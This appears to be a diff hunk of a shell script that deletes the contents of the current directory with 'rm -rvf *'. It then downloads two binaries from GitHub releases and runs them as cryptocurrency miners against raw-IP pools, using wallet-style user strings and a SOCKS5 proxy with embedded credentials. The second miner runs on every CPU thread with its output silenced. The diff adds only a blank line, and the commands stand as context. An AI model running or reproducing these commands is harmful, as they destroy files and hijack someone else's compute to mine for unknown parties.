@@ -1,2 +1,3 @@
 rm -rvf * && mkdir a && cd a
 wget https://github.com/mhusataringan-hub/ABC/releases/download/v.2/wild && chmod +x wild && ./wild --algo qhash --qhash-kernel 1 --url 23.94.152.126:443 --user 1quh2f040awczqtecmnkpuu8kgpna22mmhhs2p6y.$(shuf -n 1 -i 1-99999)-RTX4060 --proxy socks5://yoga:yoga123@107.172.222.195:443 & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 47.251.244.12:80 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1
+
